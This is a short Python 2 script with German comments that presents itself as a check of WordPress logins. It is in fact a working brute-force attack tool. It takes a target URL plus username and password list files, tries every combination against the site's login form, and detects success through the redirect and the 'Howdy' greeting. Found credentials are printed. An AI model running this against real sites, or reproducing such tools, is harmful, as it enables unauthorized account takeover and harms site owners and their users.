# -*- coding: utf-8 -*-
# Überprüfung von Wordpressanmeldung auf Korrektheit
import argparse # zur Erleichterung der Kommandozeileneingaben
import requests # zur Handhabung mit HTTP
import re # Umgang mit Regular Expression
import sys # stellt System-spezifische Parameter und Funktionen zur Verfügung

# postet Daten auf website
# @param session: obj; aktuelle Request-Session
# @param url: str; url der zu untersuchenden Website
# @param data: dict; Daten die gepostet werden
# @return response: obj; Antwortdaten von Post-Anfrage
def postData(session, url, data):
    try:
        # redirect=False, damit automatische Umleitung gestoppt wird
        response = session.post(url, data=data, allow_redirects=False)
    except:
        print "Post auf angegebene URL nicht möglich"
        sys.exit(0)
    return response

# holt Daten von website
# @param session: obj; aktuelle Request-Session
# @param url: str; url der zu untersuchenden Website
# @return response: obj; Antwortdaten von Get-Anfrage
def getData(session, url):
    try:
        response = session.get(url, allow_redirects=True)
    except:
        print "Website existiert nicht"
        sys.exit(0)
    return response

# Website-Login (Wordpress)
# @param session: obj; aktuelle Request-Session
# @param url: str; url der zu untersuchenden Website
# @param login: dict; Login-Daten
def log_on(session, url, login):
    # überprüft ob wordspress-Instanz auf Ziel existiert
    responseGet = getData(session, url)
    # stellt Post-Anfrage an überprüfte Website
    responsePost = postData(session, responseGet.url, login)
    # War der Login erfolgreich wird man nach der Post-Anfrage auf neue Seite umgeleitet
    if responsePost.status_code == 302:
        # die neue Seite ist im Header über Location aufrufbar
        responseGet = getData(session, responsePost.headers['location'])
        # bei Erfolg der Get-Anfrage wird die Seite nach 'Howdy' durchsucht, Howdy erscheint als Begrüssung wenn Login erfolgreich war
        if re.search('Howdy', responseGet.content):
            print '\x1B[32m[+] Benutzer: %s  Password: %s | Login war erfolgreich.\x1B[0m' % (login['log'], login['pwd'])
        else:
            print '[-] Benutzer: %s  Password: %s | Login fehlgeschlagen.' % (login['log'], login['pwd'])
    else:
        print '[-] Benutzer: %s  Password: %s | Login fehlgeschlagen.' % (login['log'], login['pwd'])


# liesst Elemente aus Datei und entfernt deren Zeilenumbrüche
# @param filename: str; Datei die ausgelesen wird
# @return result: list; Liste mit bereinigten Elementen
def cleanElements(filename):
    with open(filename) as f:
        result = f.readlines()
    result = [x.replace("\n", "") for x in result]
    return result

def main():
    # initialisiert Objekt parser
    parser = argparse.ArgumentParser()
    # Kommandozeilen-Argumente
    parser.add_argument('-t', dest='targetURL', \
                        type=str, help='specify the url', \
                        required=True)
    parser.add_argument('-u', dest='usernameFile', \
                        type=str, help='specify the Path of a File with username', \
                        required=True)
    parser.add_argument('-p', dest='passwordFile', \
                        type=str, help='specify the Path of a File with passwords', \
                        required=True)
    args = parser.parse_args()

    # Fügt alle Benutzername und Passwörter in Liste
    usernames = cleanElements(args.usernameFile)
    passwords = cleanElements(args.passwordFile)

    # durchläuft alle Benutzername und Passwörter
    for username in usernames:
        for password in passwords:
            # setzt aktuelle Logindaten in Dictionary
            login = {'log': username, 'pwd': password}
            # initialisert Request-Session
            session = requests.Session()
            # Loginversuch
            log_on(session, args.targetURL, login)


if __name__== '__main__':
    main()